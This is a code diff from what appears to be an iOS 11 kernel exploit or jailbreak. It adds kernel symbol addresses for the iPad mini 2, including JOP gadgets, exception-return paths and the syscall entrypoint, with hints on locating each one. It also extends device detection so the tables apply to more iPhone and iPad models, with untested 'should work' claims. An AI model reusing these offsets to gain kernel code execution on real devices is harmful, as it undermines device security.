@@ -87,6 +87,29 @@ uint64_t ksymbols_iphone_10_15B202[] = {
   0xfffffff0071e4ed8, // KSYMBOL_SLEH_SYNC_EPILOG
 };
 
+// ipad mini 2 wifi
+uint64_t ksymbols_ipad_mini_2_wifi_15b202[] = {
+    0xFFFFFFF0074947EC, // KSYMBOL_OSARRAY_GET_META_CLASS,
+    0xFFFFFFF007523A98, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
+    0xFFFFFFF007525240, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
+    0xFFFFFFF0073A6F84, // KSYMBOL_CSBLOB_GET_CD_HASH
+    0xFFFFFFF0070B8590, // KSYMBOL_KALLOC_EXTERNAL
+    0xFFFFFFF0070B85C0, // KSYMBOL_KFREE
+    0xFFFFFFF0070B85BC, // KYSMBOL_RET
+    0xFFFFFFF0074AE718, // KSYMBOL_OSSERIALIZER_SERIALIZE,
+    0xFFFFFFF007549D40, // KSYMBOL_KPRINTF
+    0xFFFFFFF0074B96B0, // KSYMBOL_UUID_COPY
+    0xFFFFFFF00756E000, // KSYMBOL_CPU_DATA_ENTRIES         // 0x6000 in to the data segment
+    0xFFFFFFF00708818C, // KSYMBOL_VALID_LINK_REGISTER      // look for reference to  FAR_EL1 (Fault Address Register (EL1))
+    0xFFFFFFF007088164, // KSYMBOL_X21_JOP_GADGET           // look for references to FPCR (Floating-point Control Register)
+    0xFFFFFFF007088434, // KSYMBOL_EXCEPTION_RETURN         // look for references to Set PSTATE.DAIF [--IF]
+    0xFFFFFFF0070883E4, // KSYMBOL_THREAD_EXCEPTION_RETURN  // a bit before exception_return
+    0xFFFFFFF00719CF44, // KSYMBOL_SET_MDSCR_EL1_GADGET     // look for references to MDSCR_EL1
+    0xFFFFFFF0073F6094, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
+    0xFFFFFFF007198EC0, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
+    0xfffffff0071998BC, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
+};
+
 // ip7
 uint64_t ksymbols_iphone_7_15B202[] = {
   0xfffffff0074d74cc, // KSYMBOL_OSARRAY_GET_META_CLASS,
@@ -216,7 +239,7 @@ void offsets_init() {
   
   // set the offsets
   
-  if (strcmp(build_id, "15B202") == 0) {
+  if (strcmp(build_id, "15B93") == 0 || strcmp(build_id, "15B150") == 0 || strcmp(build_id, "15B202") == 0) {
     offsets = kstruct_offsets_15B202;
   } else {
     offsets = kstruct_offsets_15B202;
@@ -227,7 +250,20 @@ void offsets_init() {
   
   // set the symbols
   
-  if (strstr(u.machine, "iPod7,1")) {
+if (strstr(u.machine, "iPhone6,1") || strstr(u.machine, "iPhone6,2")) {
+    printf("this is iPhone 5S, should work!\n");
+    symbols = ksymbols_ipad_mini_2_wifi_15b202;
+    have_syms = 1;
+} else if (strstr(u.machine, "iPad4,1") || strstr(u.machine, "iPad4,2") || strstr(u.machine, "iPad4,3")
+           || strstr(u.machine, "iPad4,4")|| strstr(u.machine, "iPad4,5")|| strstr(u.machine, "iPad4,6")) {
+    printf("this is iPad Air/mini 2, should work!\n");
+    symbols = ksymbols_ipad_mini_2_wifi_15b202;
+    have_syms = 1;
+} else if (strstr(u.machine, "iPad4,7") || strstr(u.machine, "iPad4,8") || strstr(u.machine, "iPad4,9")){
+    printf("this is iPad mini 3, should work!\n");
+    symbols = ksymbols_ipad_mini_2_wifi_15b202;
+    have_syms = 1;
+} else if (strstr(u.machine, "iPod7,1")) {
     printf("this is iPod Touch 6G, should work!\n");
     symbols = ksymbols_ipod_touch_6g_15b202;
     have_syms = 1;
@@ -235,20 +271,20 @@ void offsets_init() {
       printf("this is iPhone 6/6+, should work!\n");
       symbols = ksymbols_ipod_touch_6g_15b202;
       have_syms = 1;
-  } else if (strstr(u.machine, "iPad5,3")){
-      printf("this is iPad Air 2 [WiFi], should work!\n");
+  } else if (strstr(u.machine, "iPad5,3") || strstr(u.machine, "iPad5,4")){
+      printf("this is iPad Air 2, should work!\n");
       symbols = ksymbols_ipad_air_2_wifi_15b202;
       have_syms = 1;
-  } else if (strstr(u.machine, "iPhone8,1") || strstr(u.machine, "iPhone8,2")) {
-      printf("this is iPhone 6s/6s+, should work!\n");
+  } else if (strstr(u.machine, "iPhone8,1") || strstr(u.machine, "iPhone8,2") || strstr(u.machine, "iPhone8,4")) {
+      printf("this is iPhone 6s/6s+/SE, should work!\n");
       symbols = ksymbols_iphone_6s_15b202;
       have_syms = 1;
-  } else if (strstr(u.machine, "iPhone9,3") || strstr(u.machine, "iPhone9,4") || strstr(u.machine, "iPhone9,2")) {
+  } else if (strstr(u.machine, "iPhone9,1") || strstr(u.machine, "iPhone9,3") || strstr(u.machine, "iPhone9,2") || strstr(u.machine, "iPhone9,4")) {
     printf("this is iPhone 7/7+, should work!\n");
     symbols = ksymbols_iphone_7_15B202;
     have_syms = 1;
   } else if (strstr(u.machine, "iPhone10,6") || strstr(u.machine, "iPhone10,1") || strstr(u.machine, "iPhone10,2") || strstr(u.machine, "iPhone10,3") || strstr(u.machine, "iPhone10,4") || strstr(u.machine, "iPhone10,5")) {
-      printf("this is iPhone X / 8, should work!\n");
+      printf("this is iPhone X/8/8+, should work!\n");
       symbols = ksymbols_iphone_10_15B202;
       have_syms = 1;
   } else {
